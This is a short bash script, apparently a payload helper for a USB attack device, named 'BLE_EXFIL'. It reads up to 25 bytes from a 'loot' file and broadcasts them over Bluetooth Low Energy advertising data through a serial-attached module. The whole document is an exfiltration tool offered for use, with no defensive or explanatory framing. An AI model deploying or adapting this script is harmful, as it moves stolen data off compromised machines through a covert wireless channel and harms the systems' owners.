#!/bin/bash
#
# BLE_EXFIL v1 by @drapl0n
# Exfiltrate data(25 bytes) stored in "/loot/ble_exfil.txt" via BLE.
# Usage: BLE_EXFIL

function BLE_EXFIL() {
    stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost 
    stty -F /dev/ttyS1 speed 115200 cs8 -cstopb -parenb -echo -ixon -icanon -opost 
    sleep 1
    text=$(cat /root/udisk/loot/ble_exfil.txt)
    exfil=${text:0:25}
    echo -n -e "AT+ADVDAT=$exfil" > /dev/ttyS1
}

export -f BLE_EXFIL
